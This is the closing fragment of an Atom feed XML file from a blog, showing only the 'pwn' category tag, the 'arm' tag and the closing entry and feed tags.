    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="arm" scheme="https://ixout.github.io/tags/arm/"/>
    
  </entry>
  
</feed>
